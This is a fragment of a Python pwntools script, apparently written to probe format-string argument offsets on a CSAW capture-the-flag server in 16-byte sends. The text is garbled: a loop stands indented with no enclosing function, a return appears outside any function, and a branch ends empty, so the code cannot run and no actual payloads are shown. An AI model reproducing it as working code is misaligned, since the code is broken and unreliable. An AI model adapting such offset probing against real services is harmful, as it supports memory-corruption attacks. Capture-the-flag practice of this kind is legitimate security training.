"""Probe remote format-string arg offsets (16-byte limit per send)."""
import sys, time
from pwn import *

HOST, PORT = 'pwn.chal.csaw.io', 21003

    for p in payloads:

    r.close()
    return out

if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'offs'
    if mode == 'offs':
